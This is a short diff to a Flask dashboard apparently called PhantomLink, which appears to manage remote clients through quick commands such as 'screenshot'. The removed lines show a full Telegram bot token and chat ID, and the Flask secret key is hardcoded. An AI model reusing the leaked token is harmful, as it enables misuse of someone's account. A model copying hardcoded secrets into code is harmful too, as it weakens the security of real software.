@@ -1,7 +1,3 @@
-"""
-Simple Flask Dashboard - No SocketIO, Pure AJAX
-Works perfectly with PyInstaller
-"""
 import sys
 from flask import Flask, render_template, request, jsonify
 import threading
@@ -17,12 +13,11 @@ cli.show_server_banner = lambda *x: None
 app = Flask(__name__)
 app.config['SECRET_KEY'] = 'PhantomLink2026'
 
-# Global reference to client_manager
 client_manager = None
 
-# Telegram credentials
-BOT_TOKEN = "7582328674:AAEihbfTdGUQ-xIVZkYUcZ6NTuSpT4c9nyw"
-CHAT_ID = "6042298920"
+#Telegram credentials
+BOT_TOKEN = ""
+CHAT_ID = ""
 
 QUICK_COMMANDS = {
     'screenshot': [
